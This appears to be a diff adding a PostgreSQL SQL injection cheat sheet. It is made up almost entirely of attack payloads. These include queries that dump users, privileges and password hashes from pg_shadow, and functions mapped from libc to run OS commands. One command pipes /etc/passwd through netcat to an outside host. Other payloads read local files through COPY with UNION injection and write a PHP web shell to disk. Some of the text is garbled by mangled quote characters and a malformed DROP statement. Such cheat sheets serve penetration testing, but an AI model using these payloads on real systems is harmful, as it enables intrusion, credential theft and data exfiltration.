@@ -1,0 +1,60 @@
+#Get version
+SELECT version()
+
+#Get current User
+SELECT user;
+SELECT current_user;
+SELECT session_user;
+SELECT usename FROM pg_user;
+SELECT getpgusername();
+
+#List users
+Select username from pg_user
+
+#List password hashes
+select username, passwd FROM pg_shadow
+
+#List privileges
+SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user
+
+#List DBA accounts
+SELECT usename FROM pg_user WHERE usesuper IS TRUE
+
+#list current database
+SELECT current_database()
+
+#list databases
+SELECT datname FROM pg_database
+
+#list columns
+SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind=’r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE ‘public’)
+
+#list tables
+SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN (‘r’,”) AND n.nspname NOT IN (‘pg_catalog’, ‘pg_toast’) AND pg_catalog.pg_table_is_visible(c.oid)
+
+#ASCII/char conversions
+SELECT chr(65);
+SELECT ascii(‘A’);
+
+#avoiding quotes
+SELECT CHR(65)||CHR(66); — returns AB
+
+#Time delay
+SELECT pg_sleep(10); — postgres 8.2+ only
+CREATE OR REPLACE FUNCTION sleep(int) RETURNS int AS ‘/lib/libc.so.6′, ‘sleep’ language ‘C’ STRICT; SELECT sleep(10); –priv, create your own sleep function.  Taken from here .
+
+#Command Execution
+CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS ‘/lib/libc.so.6′, ‘system’ LANGUAGE ‘C’ STRICT; — privSELECT system(‘cat /etc/passwd | nc 10.0.0.1 8080′); — priv, commands run as postgres/pgsql OS-level user
+
+#Local File Access
+CREATE TABLE mydata(t text);
+COPY mydata FROM ‘/etc/passwd’; — priv, can read files which are readable by postgres OS-level user
+…’ UNION ALL SELECT t FROM mydata LIMIT 1 OFFSET 1; — get data back one row at a time
+…’ UNION ALL SELECT t FROM mydata LIMIT 1 OFFSET 2; — get data back one row at a time …
+DROP TABLE mytest mytest;Write to a file:
+CREATE TABLE mytable (mycol text);
+INSERT INTO mytable(mycol) VALUES (‘<? pasthru($_GET[cmd]); ?>’);
+COPY mytable (mycol) TO ‘/tmp/test.php’; –priv, write files as postgres OS-level user.  Generally you won’t be able to write to the web root, but it’s always work a try.
+– priv user can also read/write files by mapping libc functions
+
+
